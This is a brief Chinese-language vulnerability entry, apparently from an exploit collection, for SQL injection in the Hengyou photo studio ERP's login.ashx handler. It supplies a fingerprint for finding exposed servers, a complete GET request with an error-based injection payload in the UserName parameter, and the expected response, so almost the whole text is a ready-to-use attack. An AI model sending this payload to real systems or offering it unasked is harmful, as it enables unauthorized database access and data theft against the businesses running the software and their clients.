# 恒友影楼ERPlogin.ashx存在SQL注入漏洞

恒友影楼 ｜ SQL注入 ｜ —
- **指纹**：`body="BookChooseDateOrder.html"`
- **请求**：`GET /ashx/login.ashx?Method=ValidateLogin&ShopID=F0&UserName=admin'+AND+1>@@VERSION--&UserPwd=1 HTTP/1.1`
- **响应特征**：200